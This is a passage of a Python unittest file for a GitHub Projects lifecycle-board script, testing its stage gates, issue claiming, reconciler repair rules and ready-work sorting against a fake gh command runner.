"""Tier-1 hermetic tests for lifecycle_board.py's pure decision core.

Covers: gate verdict tables, claim decisions (sole-assignee / blocked),
the CLOSED six-repair reconciler set with never-repair negatives, repo-scoped
ready-work merge + Priority sort + truncation flag, packet safety,
and call-count budgets via an argv-recording fake runner. No network, no gh.
"""
from __future__ import annotations

import importlib.util
import inspect
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = Path(__file__).resolve().parent.parent / "scripts" / "lifecycle_board.py"

spec = importlib.util.spec_from_file_location("lifecycle_board", SCRIPT)
assert spec is not None and spec.loader is not None
lb = importlib.util.module_from_spec(spec)
sys.modules["lifecycle_board"] = lb
spec.loader.exec_module(lb)


def _issue(number=1, state="OPEN", state_reason=None, assignees=(), stage=None,
           closing_prs=(), open_subs=(), blocked=0, parent_number=None,
           item_id="item"):
    return lb.IssueState(
        number=number, state=state, state_reason=state_reason,
        assignees=list(assignees), author_association="OWNER", stage=stage,
        item_id=item_id, closing_prs=list(closing_prs),
        open_sub_issues=list(open_subs), blocked_by_count=blocked,
        parent_number=parent_number,
    )


def _pr(number=10, state="MERGED", merged=True, base="main", author="me"):
    return {"number": number, "state": state, "merged": merged,
            "baseRefName": base, "author": author}


class StageOrderTest(unittest.TestCase):
    def test_exact_lifecycle(self) -> None:
        self.assertEqual(lb.STAGES, ("stub", "brainstormed", "planned", "in_progress",
                                    "in_review", "done", "abandoned"))

    def test_stage_at_least(self) -> None:
        self.assertTrue(lb.stage_at_least("in_review", "planned"))
        self.assertFalse(lb.stage_at_least("stub", "planned"))
        self.assertFalse(lb.stage_at_least(None, "stub"))
        self.assertFalse(lb.stage_at_least("abandoned", "stub"))


class GateTest(unittest.TestCase):
    """Status is the permission-gated lifecycle attestation."""

    def test_brainstorm_proceeds_on_stub(self) -> None:
        g = lb.evaluate_gate("brainstorm", "stub", True, None, None)
        self.assertEqual(g.verdict, "proceed")

    def test_brainstorm_routes_to_plan_when_brainstormed_with_doc(self) -> None:
        g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, "docs/brainstorms/x.md")
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))

    def test_brainstorm_status_does_not_depend_on_local_doc(self) -> None:
        g = lb.evaluate_gate("brainstorm", "brainstormed", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))

    def test_brainstorm_on_stage_beyond_brainstormed_never_repairs(self) -> None:
        # An item that legally skipped stub→planned has no brainstorm doc by
        # construction — the gate must not walk the board backwards.
        g = lb.evaluate_gate("brainstorm", "planned", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_plan"))
        for stage in ("in_progress", "in_review", "done", "abandoned"):
            with self.subTest(stage=stage):
                g = lb.evaluate_gate("brainstorm", stage, True, None, None)
                self.assertEqual(g.verdict, "already_done")
                self.assertNotEqual(g.verdict, "repair_needed")

    def test_plan_already_done_offers_work(self) -> None:
        g = lb.evaluate_gate("plan", "planned", True, "docs/plans/x.md", None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))

    def test_plan_treats_planned_as_readiness_attestation(self) -> None:
        g = lb.evaluate_gate("plan", "planned", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "route_to_work"))

    def test_plan_stops_on_done(self) -> None:
        g = lb.evaluate_gate("plan", "done", True, None, None)
        self.assertEqual((g.verdict, g.route), ("already_done", "none"))

    def test_work_requires_at_least_planned(self) -> None:
        g = lb.evaluate_gate("work", "brainstormed", True, None, None)
        self.assertEqual((g.verdict, g.route), ("route_to_plan", "plan"))

    def test_work_gate_depends_on_status_not_artifact(self) -> None:
        g = lb.evaluate_gate("work", "planned", True, None, None)
        self.assertEqual(g.verdict, "proceed")
        g = lb.evaluate_gate("work", "planned", True, "docs/plans/x.md", None)
        self.assertEqual(g.verdict, "proceed")

    def test_work_resume_reason_names_actual_stage(self) -> None:
        g = lb.evaluate_gate("work", "in_progress", True, None, None)
        self.assertEqual(g.verdict, "proceed")
        self.assertIn("in_progress", g.reason)

    def test_work_terminal_stages_are_already_done(self) -> None:
        for stage in ("done", "abandoned"):
            with self.subTest(stage=stage):
                g = lb.evaluate_gate("work", stage, True, "docs/plans/x.md", None)
                self.assertEqual(g.verdict, "already_done")

    def test_compound_hotfix_path_without_issue(self) -> None:
        g = lb.evaluate_gate("compound", None, False, None, None)
        self.assertEqual(g.verdict, "proceed")
        self.assertIn("independent of Status", g.reason)

    def test_compound_never_mutates_lifecycle_status(self) -> None:
        self.assertEqual(lb.evaluate_gate("compound", "in_review", True, None, None).verdict, "proceed")
        self.assertEqual(lb.evaluate_gate("compound", "done", True, None, None).verdict, "proceed")
        self.assertEqual(lb.evaluate_gate("compound", "abandoned", True, None, None).verdict, "already_done")

    def test_untrusted_author_is_surfaced(self) -> None:
        g = lb.evaluate_gate("plan", "stub", True, None, None, author_association="NONE")
        self.assertEqual(g.provenance, "untrusted")


class ClaimTest(unittest.TestCase):
    def test_sole_assignee_proceeds(self) -> None:
        self.assertEqual(lb.decide_claim(["me"], "me", 0).action, "proceed")

    def test_multi_assignee_is_conflict_even_when_included(self) -> None:
        # GitHub has no CAS: two winners are legal; both must not proceed.
        d = lb.decide_claim(["me", "other"], "me", 0)
        self.assertEqual(d.action, "conflict")

    def test_foreign_assignee_is_conflict(self) -> None:
        self.assertEqual(lb.decide_claim(["other"], "me", 0).action, "conflict")

    def test_blocked_refuses_claim(self) -> None:
        # Dependencies are advisory — the claim protocol enforces them.
        self.assertEqual(lb.decide_claim(["me"], "me", 2).action, "blocked")


class ReconcilerTest(unittest.TestCase):
    """The repair set is CLOSED at six; everything else is a never-repair."""

    def test_rule1_merged_close_missed_becomes_done(self) -> None:
        s = _issue(state="CLOSED", state_reason="COMPLETED", stage="in_review",
                   closing_prs=[_pr()])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("merged_close_missed", "done")])
        self.assertEqual(flags, [])

    def test_flag_in_review_with_open_subissues_never_repairs(self) -> None:
        s = _issue(state="OPEN", stage="in_review", open_subs=[7, 9])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])  # never auto-repaired
        self.assertEqual([(f.issue, f.flag) for f in flags],
                         [(1, "in_review_with_open_subissues")])

    def test_no_flag_when_in_review_subissues_all_closed(self) -> None:
        s = _issue(state="OPEN", stage="in_review", open_subs=[])
        _repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(flags, [])

    def test_rule2_not_planned_close_becomes_abandoned_with_cascade(self) -> None:
        s = _issue(state="CLOSED", state_reason="NOT_PLANNED", stage="done",
                   open_subs=[7, 8])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs[0].rule, "not_planned_close")
        self.assertEqual(repairs[0].to_stage, "abandoned")
        self.assertEqual(repairs[0].close_sub_issues, [7, 8])

    def test_rule3_keys_on_merged_false_not_state_closed(self) -> None:
        # Merge queues: merged PRs report state CLOSED — must NOT regress.
        merged = _issue(assignees=["me"], stage="in_review",
                        closing_prs=[_pr(state="CLOSED", merged=True)])
        repairs, _ = lb.plan_repairs([merged], "main")
        self.assertNotIn("pr_closed_unmerged", [r.rule for r in repairs])

        closed_unmerged = _issue(assignees=["me"], stage="in_review",
                                 closing_prs=[_pr(state="CLOSED", merged=False, author="me")])
        repairs, _ = lb.plan_repairs([closed_unmerged], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs],
                         [("pr_closed_unmerged", "in_progress")])

    def test_rule3_ignores_non_assignee_prs(self) -> None:
        # Attacker junk PR closing unmerged must not regress the item —
        # yield/regression decisions are assignee-anchored.
        s = _issue(assignees=["me"], stage="in_review",
                   closing_prs=[_pr(state="CLOSED", merged=False, author="attacker")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    def test_rule4_abandoned_parent_cascades(self) -> None:
        s = _issue(stage="abandoned", open_subs=[3])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs[0].rule, "abandoned_cascade")
        self.assertIsNone(repairs[0].to_stage)

    def test_rule5_open_assignee_pr_advances_to_in_review(self) -> None:
        s = _issue(assignees=["me"], stage="in_progress",
                   closing_prs=[_pr(state="OPEN", merged=False, author="me")])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage) for r in repairs], [("pr_reopened", "in_review")])

    def test_flag_merged_to_non_default_branch_never_repairs(self) -> None:
        # The git-flow stall: merged into develop, issue still open.
        s = _issue(assignees=["me"], stage="in_review",
                   closing_prs=[_pr(state="MERGED", merged=True, base="develop", author="me")])
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])
        self.assertEqual([f.flag for f in flags], ["merged_to_non_default_branch"])

    def test_never_repairs_human_drags(self) -> None:
        # Open issue, no PRs, arbitrary stage: reconciler must not touch it.
        for stage in ("stub", "planned", "in_progress", "in_review", "done"):
            with self.subTest(stage=stage):
                repairs, flags = lb.plan_repairs([_issue(stage=stage)], "main")
                self.assertEqual((repairs, flags), ([], []))

    def test_abandoned_never_promoted_to_shipped(self) -> None:
        s = _issue(state="CLOSED", state_reason="COMPLETED", stage="abandoned",
                   closing_prs=[_pr()])
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertEqual(repairs, [])

    # Rule 6: sub_issue_on_board — an OPEN, parented issue must not occupy the
    # board (the Project tracks the PARENT); its board item is archived.
    def test_rule6_open_parented_boarded_issue_is_deboarded(self) -> None:
        s = _issue(number=263, state="OPEN", stage="stub", parent_number=265,
                   item_id="IT_9")
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual([(r.rule, r.to_stage, r.deboard_item_id) for r in repairs],
                         [("sub_issue_on_board", None, "IT_9")])
        self.assertIn("265", repairs[0].comment)  # audit comment names the parent
        self.assertEqual(flags, [])

    def test_rule6_absent_board_item_is_a_noop(self) -> None:
        # The idempotent second run: after removal the item is gone, so no repair.
        s = _issue(number=263, state="OPEN", stage="stub", parent_number=265,
                   item_id=None)
        repairs, flags = lb.plan_repairs([s], "main")
        self.assertEqual((repairs, flags), ([], []))

    def test_rule6_leaves_terminal_closed_subissues_untouched(self) -> None:
        # A CLOSED (terminal) sub-issue is done; rule 6 never fires for it.
        for stage in ("done", "in_review", "stub"):
            with self.subTest(stage=stage):
                s = _issue(number=263, state="CLOSED", state_reason="COMPLETED",
                           stage=stage, parent_number=265, item_id="IT_9")
                repairs, _ = lb.plan_repairs([s], "main")
                self.assertNotIn("sub_issue_on_board", [r.rule for r in repairs])

    def test_rule6_ignores_parentless_boarded_issue(self) -> None:
        s = _issue(number=42, state="OPEN", stage="planned", parent_number=None,
                   item_id="IT_1")
        repairs, _ = lb.plan_repairs([s], "main")
        self.assertNotIn("sub_issue_on_board", [r.rule for r in repairs])

    def test_rule6_preempts_stage_regression_rules(self) -> None:
        # De-boarding a parented open issue supersedes any Status repair its own
        # (noise) board stage would otherwise trigger. Both regression shapes:
        cases = {
            # rule 5 shape: in_progress + open assignee PR (would advance to in_review)
            "rule5": dict(stage="in_progress",
                          closing_prs=[_pr(state="OPEN", merged=False, author="me")]),
            # rule 3 shape: in_review + all-closed-unmerged assignee PRs (would
            # regress to in_progress)
            "rule3": dict(stage="in_review",
                          closing_prs=[_pr(state="CLOSED", merged=False, author="me")]),
        }
        for name, kw in cases.items():
            with self.subTest(shape=name):
                s = _issue(number=263, state="OPEN", parent_number=265,
                           item_id="IT_9", assignees=["me"], **kw)
                repairs, _ = lb.plan_repairs([s], "main")
                self.assertEqual([r.rule for r in repairs], ["sub_issue_on_board"])


class ReadyWorkTest(unittest.TestCase):
    def _item(self, number, repo="o/r", priority=None, title="t", type_="Issue"):
        return {"content": {"type": type_, "number": number, "repository": repo, "title": title},
                "priority": priority}

    def test_foreign_repo_items_are_dropped_never_written(self) -> None:
        items = [self._item(1, repo="o/r"), self._item(2, repo="other/repo")]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [1])

    def test_missing_or_ambiguous_repo_metadata_fails_closed(self) -> None:
        items = [
            {"content": {"type": "Issue", "number": 1, "title": "missing"}},
            self._item(2, repo=""),
            self._item(3, repo={}),
            self._item(4, repo={"nameWithOwner": "o/r"}),
        ]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [4])

    def test_blocked_items_are_excluded(self) -> None:
        items = [self._item(1), self._item(2)]
        ready, _ = lb.merge_ready_legs(items, {2: 1}, "o/r")
        self.assertEqual([r.number for r in ready], [1])

    def test_priority_sort(self) -> None:
        items = [self._item(1, priority="p3"), self._item(2, priority="p1"),
                 self._item(3, priority=None), self._item(4, priority="p2")]
        ready, _ = lb.merge_ready_legs(items, {}, "o/r")
        self.assertEqual([r.number for r in ready], [2, 4, 1, 3])

    def test_truncation_flag_at_cap(self) -> None:
        items = [self._item(i) for i in range(lb.READY_WORK_LIMIT)]
        _, truncated = lb.merge_ready_legs(items, {}, "o/r")
        self.assertTrue(truncated)
        _, truncated = lb.merge_ready_legs(items[:5], {}, "o/r")
        self.assertFalse(truncated)


class FakeRunner:
    """Argv-recording fake gh. Fails the test on unexpected argv — mocks
    cannot drift from the contract without a test naming the divergence."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, args, timeout=None):
        self.calls.append(args)
        if not self.responses:
            raise AssertionError(f"unexpected gh call: gh {' '.join(args[:6])}")
        expect_prefix, proc = self.responses.pop(0)
        if args[:len(expect_prefix)] != expect_prefix:
            raise AssertionError(f"argv drift: expected {expect_prefix}, got {args[:len(expect_prefix)]}")
        return proc


def _ok(stdout: str) -> "subprocess.CompletedProcess[str]":
    return subprocess.CompletedProcess(args=[], returncode=0, stdout=stdout, stderr="")


class ProjectLinkedReposTest(unittest.TestCase):
    """The shared board<->repo link reader used by both the doctor check and
    the bootstrap link step."""

    @staticmethod
    def _payload(slugs):
        nodes = [{"nameWithOwner": s} for s in slugs]
        return json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "repositories": {"nodes": nodes}}}}})

    def test_parses_linked_slugs(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(["o/r", "o/other"])))])
        self.assertEqual(lb.project_linked_repos("o", 5, runner), ["o/r", "o/other"])
        # Uses the owner-type-agnostic repositoryOwner query, not organization(login:).
        query = runner.calls[0][runner.calls[0].index("-f") + 1]
        self.assertIn("repositoryOwner(login: $owner)", query)
        self.assertIn("... on User", query)
        self.assertIn("... on Organization", query)

    def test_empty_when_no_repos_linked(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload([])))])
        self.assertEqual(lb.project_linked_repos("o", 5, runner), [])

    def test_none_on_query_failure(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="boom")
        runner = FakeRunner([(["api", "graphql"], fail)])
        self.assertIsNone(lb.project_linked_repos("o", 5, runner))

    def test_paginates_past_one_hundred_linked_repositories(self) -> None:
        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100)],
                             "pageInfo": {"hasNextPage": True, "endCursor": "CURSOR"}}}}}})
        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "repositories": {"nodes": [{"nameWithOwner": f"o/r{i}"} for i in range(100, 150)],
                             "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
        runner = FakeRunner([(["api", "graphql"], _ok(first)),
                             (["api", "graphql"], _ok(second))])
        linked = lb.project_linked_repos("o", 5, runner)
        self.assertEqual(len(linked), 150)
        self.assertIn("after=CURSOR", runner.calls[1])


class ProjectWorkflowsTest(unittest.TestCase):
    """The built-in-workflow enabled-state reader behind the doctor's
    item_closed_workflow check. The API exposes only name + enabled."""

    @staticmethod
    def _payload(workflows):
        nodes = [{"name": n, "enabled": e} for n, e in workflows]
        return json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": nodes}}}}})

    def test_parses_name_to_enabled_map(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(
            [("Item closed", True), ("Item reopened", False)])))])
        self.assertEqual(lb.project_workflows("o", 5, runner),
                         {"Item closed": True, "Item reopened": False})
        # Owner-type-agnostic (User + Organization), like the linked-repos reader.
        query = runner.calls[0][runner.calls[0].index("-f") + 1]
        self.assertIn("repositoryOwner(login: $owner)", query)
        self.assertIn("... on User", query)
        self.assertIn("... on Organization", query)

    def test_none_on_query_failure(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="boom")
        runner = FakeRunner([(["api", "graphql"], fail)])
        self.assertIsNone(lb.project_workflows("o", 5, runner))

    def test_paginates_workflows(self) -> None:
        first = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": [{"name": "Other", "enabled": True}],
                          "pageInfo": {"hasNextPage": True, "endCursor": "NEXT"}}}}}})
        second = json.dumps({"data": {"repositoryOwner": {"projectV2": {
            "workflows": {"nodes": [{"name": "Item closed", "enabled": True}],
                          "pageInfo": {"hasNextPage": False, "endCursor": None}}}}}})
        runner = FakeRunner([(["api", "graphql"], _ok(first)),
                             (["api", "graphql"], _ok(second))])
        self.assertTrue(lb.project_workflows("o", 5, runner)["Item closed"])
        self.assertIn("after=NEXT", runner.calls[1])


class ProjectAccessTest(unittest.TestCase):
    """The read-only viewerCanUpdate query works for both Project owner types."""

    def test_parses_user_and_organization_shapes(self) -> None:
        for owner_type in ("User", "Organization"):
            with self.subTest(owner_type=owner_type):
                payload = json.dumps({"data": {"repositoryOwner": {
                    "__typename": owner_type,
                    "projectV2": {"id": "PVT_1", "viewerCanUpdate": True},
                }}})
                runner = FakeRunner([(["api", "graphql"], _ok(payload))])
                access = lb.project_access("acme", 5, runner)
                self.assertEqual(access, lb.ProjectAccess(owner_type, "PVT_1", True))

    def test_fails_closed_on_missing_project_or_capability(self) -> None:
        payloads = [
            {"data": {"repositoryOwner": {"__typename": "Organization", "projectV2": None}}},
            {"data": {"repositoryOwner": {"__typename": "Organization",
                                            "projectV2": {"id": "PVT_1"}}}},
            {"data": {"repositoryOwner": {"__typename": "Enterprise",
                                            "projectV2": {"id": "PVT_1",
                                                          "viewerCanUpdate": True}}}},
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
                self.assertIsNone(lb.project_access("acme", 5, runner))


class CallBudgetTest(unittest.TestCase):
    """Ready-work is 2 gh calls at ANY board size (the bd-ready replacement)."""

    def test_ready_work_is_exactly_two_calls(self) -> None:
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        items = [{"content": {"type": "Issue", "number": i, "repository": "o/r", "title": f"i{i}"}}
                 for i in range(1, 41)]
        blocked_body = {"data": {"repository": {
            f"i{i}": {"blockedBy": {"totalCount": 1 if i % 2 else 0}} for i in range(1, 41)}}}
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "o"], _ok(json.dumps({"items": items}))),
            (["api", "graphql"], _ok(json.dumps(blocked_body))),
        ])

        # _require_board reads config from disk; call the legs directly with
        # the injected runner instead.
        got_items = lb._item_list(board, runner, "status:planned no:assignee")
        numbers = [i["content"]["number"] for i in got_items]
        blocked = lb._batched_blocked_counts(numbers, ctx, runner)
        ready, truncated = lb.merge_ready_legs(got_items, blocked, "o/r")

        self.assertEqual(len(runner.calls), 2)
        self.assertEqual(len(ready), 20)  # odd numbers blocked
        self.assertFalse(truncated)

    def test_failed_ready_work_hard_errors_never_empty(self) -> None:
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        runner = FakeRunner([
            (["project", "item-list"], subprocess.CompletedProcess([], 1, "", "boom")),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb._item_list(board, runner, "status:planned no:assignee")
        self.assertEqual(caught.exception.code, "ready_work_failed")


def _issue_query_response(*, number=5, assignees=(), stage="planned", blocked=0,
                          item_id="item5", url="u", open_subs=(), parent=None):
    """Build an ISSUE_QUERY graphql response with the dict-shaped blockedBy the
    new parser reads (blockedBy(first:1){totalCount}). `parent` is an int parent
    issue number (None => no parent node, i.e. a top-level item)."""
    issue = {
        "number": number, "state": "OPEN", "stateReason": None, "url": url,
        "authorAssociation": "OWNER",
        "blockedBy": {"totalCount": blocked},
        "assignees": {"nodes": [{"login": a} for a in assignees]},
        "closedByPullRequestsReferences": {"nodes": []},
        "subIssues": {"nodes": [{"number": n, "state": "OPEN"} for n in open_subs]},
        "projectItems": {"nodes": [{"id": item_id,
            "project": {"id": "P", "number": 1, "owner": {"login": "acme"}},
            "fieldValueByName": {"name": stage}}]}}
    if parent is not None:
        issue["parent"] = {"number": parent}
    return {"data": {"repository": {"issue": issue}}}


class SetStatusGateTest(unittest.TestCase):
    """The in_review seam gate: verb_set_status refuses to advance a parent to
    in_review while it has open sub-issues, unless force=True."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n", encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None
        self._field_list = _ok(json.dumps({"fields": [{"name": "Status", "id": "F",
            "projectId": "P", "options": [{"id": f"o_{s}", "name": s} for s in lb.STAGES]}]}))

    def _runner_through_fetch(self, open_subs):
        return FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=open_subs)))),
        ])

    def test_refuses_in_review_with_open_subissues(self) -> None:
        runner = self._runner_through_fetch(open_subs=[7, 8])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_set_status(5, "in_review", self.ctx, runner)
        self.assertEqual(caught.exception.code, "open_sub_issues")
        # Refused BEFORE any board write (no item-edit call).
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_force_bypasses_the_gate(self) -> None:
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=[7])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_review"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_review", self.ctx, runner, force=True)
        self.assertEqual(result["stage"], "in_review")

    def test_clean_parent_advances_to_in_review(self) -> None:
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="in_progress", open_subs=[])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_review"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_review", self.ctx, runner)
        self.assertEqual(result["stage"], "in_review")

    def test_other_stages_not_gated_by_open_subissues(self) -> None:
        # Advancing to in_progress with open sub-issues is fine — only in_review is gated.
        runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(
                _issue_query_response(stage="planned", open_subs=[7])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_set_status(5, "in_progress", self.ctx, runner)
        self.assertEqual(result["stage"], "in_progress")


class ClaimVerbTest(unittest.TestCase):
    """End-to-end verb_claim over a FakeRunner: win, two-winner conflict, and
    blocked-refusal. blockedBy rides the new dict-with-totalCount shape."""

    def setUp(self) -> None:
        import tempfile
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = self._tmp.name
        (Path(root) / "agentic-engineering.md").write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n---\n",
            encoding="utf-8")
        self.ctx = lb.RepoContext(root=root, main_root=root, origin_owner="acme",
                                  origin_repo="widget", default_branch="main")
        _orig_load, _orig_save = lb.load_cache, lb.save_cache
        lb.load_cache = lambda _ctx: {}
        lb.save_cache = lambda _ctx, _cache: None
        self.addCleanup(lambda: (setattr(lb, "load_cache", _orig_load),
                                 setattr(lb, "save_cache", _orig_save)))
        self._field_list = _ok(json.dumps({"fields": [{"name": "Status", "id": "F",
            "projectId": "P", "options": [{"id": f"o_{s}", "name": s} for s in lb.STAGES]}]}))

    def test_win_path_assigns_confirms_and_sets_status(self) -> None:
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),                                    # _gh_me
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=())))),  # initial read
            (["issue", "edit", "5", "--repo", "acme/widget", "--add-assignee", "@me"], _ok("")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me"])))),  # confirm sole
            # verb_set_status(in_progress): resolve_schema + fetch + item-edit
            (["project", "field-list", "1", "--owner", "acme"], self._field_list),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me"])))),
            (["project", "item-edit", "--id", "item5", "--project-id", "P",
              "--field-id", "F", "--single-select-option-id", "o_in_progress"], _ok("{}")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (True, "proceed"))

    def test_two_winner_conflict_self_unassigns(self) -> None:
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=())))),
            (["issue", "edit", "5", "--repo", "acme/widget", "--add-assignee", "@me"], _ok("")),
            # confirm read: two winners raced in.
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=["me", "rival"])))),
            (["issue", "edit", "5", "--repo", "acme/widget", "--remove-assignee", "@me"], _ok("")),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "claim_conflict"))
        self.assertTrue(any(c[-2:] == ["--remove-assignee", "@me"] for c in runner.calls))

    def test_blocked_refuses_without_assigning(self) -> None:
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), blocked=2)))),
        ])
        result = lb.verb_claim(5, self.ctx, runner)
        self.assertEqual((result["claimed"], result["verdict"]), (False, "blocked"))
        # No assign call was ever made.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))

    def test_sub_issue_claim_refused_before_any_board_write(self) -> None:
        # An OPEN parented issue is a sub-issue: refuse with a structured error
        # naming the parent, and never touch the board (no assign, no item-edit).
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),
            (["api", "graphql"], _ok(json.dumps(_issue_query_response(assignees=(), parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        self.assertIn("269", str(caught.exception))
        # No mutating call of any kind was made.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_sub_issue_guard_precedes_self_assigned_write(self) -> None:
        # A sub-issue already assigned to ME would otherwise sail past the
        # assignee checks straight into the board write. The parent guard must
        # win first: refuse with sub_issue_claim, mutate nothing.
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),
            (["api", "graphql"],
             _ok(json.dumps(_issue_query_response(assignees=["me"], parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        # Neither an assign nor a board write happened.
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))

    def test_sub_issue_guard_precedes_claim_conflict(self) -> None:
        # A sub-issue assigned to SOMEONE ELSE would otherwise return a
        # claim_conflict verdict. The parent guard outranks it: this is a
        # sub_issue_claim refusal, not a conflict, and touches nothing.
        runner = FakeRunner([
            (["api", "user"], _ok("me\n")),
            (["api", "graphql"],
             _ok(json.dumps(_issue_query_response(assignees=["other"], parent=269)))),
        ])
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_claim(5, self.ctx, runner)
        self.assertEqual(caught.exception.code, "sub_issue_claim")
        self.assertFalse(any("--add-assignee" in c for c in runner.calls))
        self.assertFalse(any(c[:2] == ["project", "item-edit"] for c in runner.calls))


class SubStatusVerbTest(unittest.TestCase):
    """verb_sub_status drives the mutually-exclusive `status:*` labels board-free.
    Every gh call carries an explicit --repo (in-script gh discipline)."""

    def setUp(self) -> None:
        self.ctx = lb.RepoContext(root=".", main_root=".", origin_owner="acme",
                                  origin_repo="widget", default_branch="main")

    @staticmethod
    def _view(labels, state="OPEN"):
        return _ok(json.dumps({"labels": [{"name": n} for n in labels], "state": state}))

    def test_invalid_status_rejected_before_any_gh_call(self) -> None:
        runner = FakeRunner([])  # any call would raise "unexpected gh call"
        with self.assertRaises(lb.BoardError) as caught:
            lb.verb_sub_status(7, "done_ish", self.ctx, runner)
        self.assertEqual(caught.exception.code, "invalid_sub_status")
        self.assertEqual(runner.calls, [])

    def test_in_progress_from_bare_issue_ensures_label_and_adds_it(self) -> None:
        runner = FakeRunner([
            (["issue", "view", "7", "--repo", "acme/widget", "--json", "labels,state"],
             self._view([])),
